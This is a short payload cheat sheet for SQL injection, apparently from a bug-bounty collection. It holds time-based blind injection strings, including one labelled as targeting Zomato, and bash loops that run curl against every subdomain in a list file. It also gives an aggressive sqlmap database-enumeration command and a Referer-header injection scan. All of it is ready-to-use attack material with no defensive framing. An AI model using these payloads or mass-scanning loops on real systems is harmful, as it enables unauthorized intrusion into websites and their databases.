### SQL injections:

1) SQL injection email parameter via POST method:

   Payload:

    ```
   '%2b(select*from(select(sleep(2)))a)%2b'
    ```

2) Zomato Blind sql:
   ```
   res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0

   ```

3) Blind SQL onliner for domains:
```
while read -r url; do echo "Testing $url"; curl -m 20 -s -o /dev/null -w "%{time_total}\n" "$url/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z"; done < sub.txt

```

4) SQLMAP command:

   ```
   python3 sqlmap.py -r request --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs

   ```

5) Time based SQL injection:
  
      ```
      while read -r url; do echo "Testing $url"; curl -m 20 -s -o /dev/null -w "%{time_total}\n" "$url/0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z"; done < sub.txt
      ```

6) Time based SQL injection Via referer headers
   
   ```
   cat sub.txt | while read domain; do curl -s -H "Referer: http://www.google.com/search?hl=en&q='+(select*from(select(sleep(7*7)))a)+'" "$domain" | grep -q "200 OK" && echo "Vulnerable: $domain" || echo "Not Vulnerable: $domain"; done
   
```


